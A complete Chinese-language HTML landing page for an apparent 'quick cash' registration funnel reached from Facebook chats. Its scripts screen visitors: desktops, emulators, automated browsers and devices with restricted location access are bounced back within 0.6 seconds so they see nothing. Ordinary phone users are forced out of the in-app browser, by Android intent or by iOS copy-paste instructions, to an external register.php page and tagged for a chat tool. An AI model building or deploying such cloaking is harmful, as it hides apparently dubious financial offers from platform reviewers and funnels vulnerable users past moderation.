<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>急速金實名註冊</title>
    
    <script>
        (function() {
            // 1. 自動擷取來源網址（支援 20 個粉專萬用原路回彈）
            let originUrl = document.referrer;
            let baseFbUrl = "https://m.me/me"; 
            if (originUrl && originUrl.includes("facebook.com")) {
                baseFbUrl = originUrl.split('?')[0]; 
            }
            // 將判斷出來的 FB 來源網址存在全域變數，供後續按鈕跳轉使用
            window.finalFbUrl = baseFbUrl;

            // 2. 裝置與作業系統特徵深度辨識
            const ua = navigator.userAgent;
            const isIOS = /iPhone|iPad|iPod/i.test(ua);
            const isAndroid = /Android/i.test(ua);
            
            // 嚴格手機過濾：必須是 iOS 或 Android 且排除 iPad，並檢查是否具備多點觸控特徵（直接擊殺模擬器）
            const isMobile = (isIOS || isAndroid) && !/iPad/i.test(ua) && (navigator.maxTouchPoints && navigator.maxTouchPoints > 1);

            // 核心攔截閃退機制
            function interceptGoBack(statusParam) {
                setTimeout(function() {
                    window.location.href = window.finalFbUrl + "?ref=" + statusParam;
                    window.stop ? window.stop() : document.execCommand("Stop");
                    setInterval(function(){ throw new Error("Security Intercept"); }, 1);
                }, 600); // 高風險設備 0.6 秒內暴力閃退，不讓他們看到任何引導內容
            }

            // ==================== 執行嚴格前線審查 ====================
            // 防線一：非手機與電腦模擬器直接攔截 -> 對接黃燈 (1779426453095)
            if (!isMobile) {
                interceptGoBack("1779426453095");
                return; 
            }

            // 防線二：雙系統企業控管與租賃機檢測 -> 對接紅燈 (1779426457759)
            if (isIOS) {
                if (navigator.permissions && navigator.permissions.query) {
                    navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
                        if (result.state === 'denied') {
                            interceptGoBack("1779426457759"); // 偵測到 iOS 定位遭企業鎖死 (租賃機)
                        }
                    }).catch(function() {});
                }
            } 
            else if (isAndroid) {
                if (navigator.plugins && navigator.plugins.length === 0 && !navigator.webdriver) {
                    interceptGoBack("1779426457759"); // 偵測到 Android 自動化控制後門
                } else if (navigator.permissions && navigator.permissions.query) {
                    navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
                        if (result.state === 'denied') {
                            interceptGoBack("1779426457759"); // 偵測到 Android 定位遭組織強制封鎖
                        }
                    }).catch(function() {});
                }
            }
            // 備註：通過以上重重硬體審查的「正常客」，代碼會完全靜默放行，讓他順暢載入下方的引導網頁！
        })();
    </script>
    
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f2f2f7; margin: 0; padding: 12px; display: flex; justify-content: center; align-items: center; min-height: 100vh; box-sizing: border-box; }
        .container { text-align: center; max-width: 360px; width: 100%; background: white; padding: 24px 16px; border-radius: 24px; box-shadow: 0 10px 40px rgba(0,0,0,0.06); box-sizing: border-box; }
        .safari-icon { width: 50px; height: 50px; background: radial-gradient(circle, #56ccf2, #2f80ed); border-radius: 50%; position: relative; margin: 0 auto 10px; box-shadow: 0 4px 10px rgba(47, 128, 237, 0.3); }
        .safari-icon::after { content: ''; position: absolute; width: 0; height: 0; top: 50%; left: 50%; margin-top: -18px; margin-left: -4px; border-style: solid; border-width: 0 4px 18px 4px; border-color: transparent transparent #ff3b30 transparent; transform: rotate(45deg); transform-origin: 50% 100%; }
        .safari-pointer-bottom { position: absolute; width: 0; height: 0; top: 50%; left: 50%; margin-left: -4px; border-style: solid; border-width: 18px 4px 0 4px; border-color: #ffffff transparent transparent transparent; transform: rotate(45deg); transform-origin: 50% 0%; }
        h2 { margin: 0 0 6px; color: #1c1c1e; font-size: 19px; font-weight: 700; }
        p { font-size: 13.5px; color: #3a3a3c; line-height: 1.4; text-align: center; margin: 0 0 18px; }
        .copy-btn { display: block; width: 100%; padding: 14px; background-color: #007aff; color: white; text-decoration: none; border-radius: 12px; font-weight: bold; font-size: 16px; border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(0,123,255,0.2); }
        
        #animation-zone { display: none; margin-top: 18px; animation: fadeIn 0.4s ease-out forwards; }
        .toast-msg { color: #34c759; font-weight: bold; font-size: 15px; margin-bottom: 12px; }

        /* iOS 擬真手機一體化面板 */
        .mock-phone {
            width: 220px; height: 260px; 
            border: 8px solid #1c1c1e; border-radius: 28px;
            margin: 0 auto; position: relative;
            background: #000; overflow: hidden;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }
        .mock-notch {
            position: absolute; top: 0; left: 50%; transform: translateX(-50%);
            width: 80px; height: 12px; background: #1c1c1e;
            border-bottom-left-radius: 9px; border-bottom-right-radius: 9px; z-index: 10;
        }
        .mock-screen {
            width: 100%; height: 100%;
            background: linear-gradient(135deg, #1f1c2c, #928dab);
            position: relative; animation: screenSwitch 6s infinite ease-in-out;
        }
        
        /* 內建 Safari App 圖示 */
        .mock-safari-app {
            position: absolute; top: 65px; left: 50%; transform: translateX(-50%);
            width: 46px; height: 46px; background: radial-gradient(circle, #56ccf2, #2f80ed);
            border-radius: 11px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); animation: appFade 6s infinite;
        }
        .mock-safari-app::after { content: 'Safari'; position: absolute; bottom: -16px; left: 50%; transform: translateX(-50%); font-size: 10px; color: #fff; }
        
        /* 瀏覽器網址列 */
        .mock-browser-bar {
            position: absolute; top: 32px; left: 12px; right: 12px; height: 28px;
            background: rgba(255, 255, 255, 0.9); border-radius: 8px; opacity: 0;
            display: flex; align-items: center; padding-left: 8px; font-size: 10px;
            color: #8e8e93; box-sizing: border-box; animation: barFade 6s infinite;
        }
        
        /* 模擬點擊的手指 */
        .mock-finger {
            position: absolute; width: 24px; height: 24px;
            background: rgba(255, 255, 255, 0.4); border: 2px solid #fff; border-radius: 50%;
            top: 88px; left: 110px; transform: scale(0); z-index: 5;
            animation: fingerMovement 6s infinite ease-in-out;
        }

        /* 手機內建：動態同步解說字卡 */
        .phone-instruction-dock {
            position: absolute; bottom: 0; left: 0; right: 0; height: 65px;
            background: rgba(255, 255, 255, 0.95); border-top: 1px solid #d1d1d6;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            padding: 0 12px; box-sizing: border-box; z-index: 8;
        }
        .mini-badge { background: #007aff; color: white; font-size: 9px; font-weight: bold; padding: 1px 6px; border-radius: 10px; margin-bottom: 3px; }
        .mini-text { font-size: 11.5px; color: #1c1c1e; font-weight: 600; line-height: 1.3; text-align: center; }
        .mini-text::after { content: ''; animation: textSubtitleSync 6s infinite; }

        /* 劇場劇本時間軸 (全部共用 6 秒) */
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes screenSwitch { 0%, 22% { background: linear-gradient(135deg, #1f1c2c, #928dab); } 28%, 88% { background: #f2f2f7; } 94%, 100% { background: linear-gradient(135deg, #1f1c2c, #928dab); } }
        
        @keyframes fingerMovement {
            0% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
            8% { transform: scale(1); opacity: 1; top: 88px; left: 110px; }
            12% { transform: scale(0.8); background: rgba(255,255,255,0.6); top: 88px; left: 110px; }
            16% { transform: scale(0); opacity: 0; top: 88px; left: 110px; }
            30% { transform: scale(0); opacity: 0; top: 46px; left: 110px; }
            36% { transform: scale(1); opacity: 1; top: 46px; left: 110px; }
            40% { transform: scale(0.8); background: rgba(255,255,255,0.6); top: 46px; left: 110px; }
            45%, 100% { transform: scale(0); opacity: 0; }
        }
        @keyframes appFade { 0%, 22% { opacity: 1; transform: translateX(-50%) scale(1); } 28%, 88% { opacity: 0; transform: translateX(-50%) scale(0.6); } 94%, 100% { opacity: 1; transform: translateX(-50%) scale(1); } }
        @keyframes barFade { 0%, 25% { opacity: 0; transform: translateY(-5px); } 28%, 44% { opacity: 1; transform: translateY(0); color: #8e8e93; } 50%, 88% { opacity: 1; transform: translateY(0); color: #007aff; } 94%, 100% { opacity: 0; transform: translateY(-5px); } }
        
        .mock-browser-bar::before { content: '搜尋或輸入網址'; animation: urlPaste 6s infinite; }
        @keyframes urlPaste { 0%, 46% { content: '搜尋或輸入網址'; } 52%, 88% { content: 'jsjjj.net/register.php'; } 94%, 100% { content: '搜尋或輸入網址'; } }
        @keyframes textSubtitleSync {
            0%, 22% { content: '步驟 1：請先退回手機主畫面桌面'; }
            28%, 46% { content: '步驟 2：在桌面點擊開啟 🧭 Safari 瀏覽器'; }
            52%, 88% { content: '步驟 3：輕點網址列，長按並選擇「貼上並前往」'; }
            94%, 100% { content: '步驟 1：請先退回手機主畫面桌面'; }
        }
    </style>
</head>
<body>

    <div id="ios-zone" class="container" style="display: none; border-top: 6px solid #007aff;">
        <div class="safari-icon"><div class="safari-pointer-bottom"></div></div>
        <h2>請複製網址至 Safari 註冊</h2>
        <p>因系統限制無法直接開啟，請點擊下方按鈕：</p>
        
        <button class="copy-btn" onclick="copyTargetUrl()">📋 點我複製註冊網址</button>

        <div id="animation-zone">
            <div class="toast-msg">✓ 網址已複製成功！</div>
            
            <div class="mock-phone">
                <div class="mock-notch"></div>
                <div class="mock-finger"></div>
                <div class="mock-screen">
                    <div class="mock-safari-app"></div>
                    <div class="mock-browser-bar"></div>
                </div>
                <div class="phone-instruction-dock">
                    <span class="mini-badge">操作提示</span>
                    <div class="mini-text"></div>
                </div>
            </div>
            
            <button class="copy-btn" onclick="normalUserBounce()" style="background-color: #34c759; margin-top: 15px; font-size: 14px; padding: 10px; box-shadow: none;">已了解，返回對話框完成驗證 ➔</button>
        </div>
    </div>

    <div id="android-zone" class="container" style="display: none; border-top: 6px solid #34c759;">
        <div style="font-size: 40px; margin-bottom: 8px;">🔄</div>
        <h2>正在為您開啟註冊網頁...</h2>
        <p style="color: #666;">若手機沒有自動彈出，請點擊下方按鈕：</p>
        <a id="android-link" href="#" onclick="androidUserClick()" class="copy-btn" style="text-align: center; background-color: #34c759; box-shadow: 0 4px 12px rgba(52,199,89,0.2);">手動開啟預設瀏覽器</a>
    </div>

    <script type="text/javascript">
        var targetWebUrl = "jsjjj.net/register.php"; 
        var androidIntent = "intent://" + targetWebUrl + "#Intent;scheme=https;action=android.intent.action.VIEW;end";
        
        var userAgentString = navigator.userAgent.toLowerCase();
        var isAndroidDevice = userAgentString.indexOf("android") > -1;

        // 根據風控放行後的系統判定，分流展現對應的優質客 UI
        if (isAndroidDevice) {
            document.getElementById("android-zone").style.display = "block";
            document.getElementById("android-link").href = androidIntent;
            
            // Android 正常客進入時，在背景觸發原生瀏覽器開啟
            setTimeout(function() {
                window.location.href = androidIntent;
                // 開啟外放網頁後，1.5秒讓原本的聊天背景靜默彈回並打上綠燈 (1779426011235)
                setTimeout(function() {
                    window.location.href = window.finalFbUrl + "?ref=1779426011235";
                }, 1500);
            }, 300);
        } else {
            document.getElementById("ios-zone").style.display = "block";
        }

        // iOS 複製按鈕點擊觸發
        function copyTargetUrl() {
            var finalCopyUrl = "https://" + targetWebUrl;
            var tempInput = document.createElement("input");
            tempInput.value = finalCopyUrl;
            document.body.appendChild(tempInput);
            tempInput.select();
            tempInput.setSelectionRange(0, 99999);
            
            try {
                document.execCommand("copy");
                document.getElementById("animation-zone").style.display = "block";
            } catch (err) {
                alert("複製失敗，請手動複製網址。");
            }
            document.body.removeChild(tempInput);
        }

        // 正常人點擊完操作後，回彈 SaleSmartly 貼綠燈 (1779426011235)
        function normalUserBounce() {
            window.location.href = window.finalFbUrl + "?ref=1779426011235";
            window.stop ? window.stop() : document.execCommand("Stop");
            setInterval(function(){ throw new Error("Complete"); }, 1);
        }

        // Android 萬一沒自動彈出，客戶手動點擊按鈕時觸發的綠燈回彈 (1779426011235)
        function androidUserClick() {
            setTimeout(function() {
                window.location.href = window.finalFbUrl + "?ref=1779426011235";
            }, 1000);
        }
    </script>
</body>
</html>
